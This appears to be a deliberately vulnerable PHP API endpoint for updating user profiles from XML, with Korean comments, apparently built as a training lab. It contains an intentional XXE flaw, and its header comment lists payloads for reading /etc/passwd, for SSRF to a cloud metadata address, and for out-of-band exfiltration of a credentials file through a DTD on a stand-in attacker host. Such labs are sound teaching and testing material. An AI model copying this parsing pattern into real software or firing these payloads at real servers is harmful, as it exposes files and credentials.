<?php
/**
 * /api/xml-profile.php — 사용자 프로필 XML 업데이트 API
 *
 * [취약 포인트: XXE — XML External Entity Injection]
 *  - LIBXML_NOENT  : 엔티티(&xxe;)를 실제 값으로 치환
 *  - LIBXML_DTDLOAD: 외부 DTD 로드 허용
 *  → 공격자가 외부 엔티티로 서버 파일 읽기, SSRF, DoS 유발 가능
 *
 * [정상 요청 예시]
 *  POST /api/xml-profile.php
 *  Content-Type: application/xml
 *
 *  <?xml version="1.0" encoding="UTF-8"?>
 *  <profile>
 *    <username>alice</username>
 *    <email>alice@corp.internal</email>
 *    <dept>보안팀</dept>
 *  </profile>
 *
 * [XXE 공격 예시 — 파일 읽기]
 *  <?xml version="1.0" encoding="UTF-8"?>
 *  <!DOCTYPE foo [
 *    <!ENTITY xxe SYSTEM "file:///etc/passwd">
 *  ]>
 *  <profile>
 *    <username>&xxe;</username>
 *    <email>x@x.com</email>
 *    <dept>x</dept>
 *  </profile>
 *
 * [XXE 공격 예시 — SSRF]
 *  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 *
 * [OOB(Out-of-Band) XXE — 데이터 외부 반출]
 *  <!DOCTYPE foo [
 *    <!ENTITY % file SYSTEM "file:///var/www/html/secret/credentials.txt">
 *    <!ENTITY % dtd  SYSTEM "http://ATTACKER/evil.dtd">
 *    %dtd;
 *  ]>
 */

header('Content-Type: application/json; charset=utf-8');

/* ── 메서드 확인 ── */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'POST only']);
    exit;
}

$raw = file_get_contents('php://input');
if (empty(trim($raw))) {
    http_response_code(400);
    echo json_encode(['error' => 'Empty body']);
    exit;
}

/* ── 취약한 XML 파싱 ──────────────────────────────────
   LIBXML_NOENT  → &entity; 참조를 실제 값으로 치환
   LIBXML_DTDLOAD → 외부 DTD 허용
   (안전한 코드라면 두 플래그 모두 제거하고
    libxml_disable_entity_loader(true) 호출)
──────────────────────────────────────────────────── */
libxml_use_internal_errors(true);

$dom = new DOMDocument('1.0', 'UTF-8');
$dom->loadXML($raw, LIBXML_NOENT | LIBXML_DTDLOAD);

$errors = libxml_get_errors();
libxml_clear_errors();

/* ── 필드 추출 ── */
$get = fn(string $tag) =>
    $dom->getElementsByTagName($tag)->item(0)?->nodeValue ?? null;

$username = $get('username');
$email    = $get('email');
$dept     = $get('dept');

if ($username === null && $email === null) {
    http_response_code(422);
    echo json_encode([
        'error'  => 'Required fields missing',
        'fields' => ['username', 'email'],
    ]);
    exit;
}

/* ── 응답 — 파싱된 값을 그대로 반환 (XXE 결과 포함) ── */
echo json_encode([
    'status'   => 'profile_updated',
    'username' => $username,
    'email'    => $email,
    'dept'     => $dept,
], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
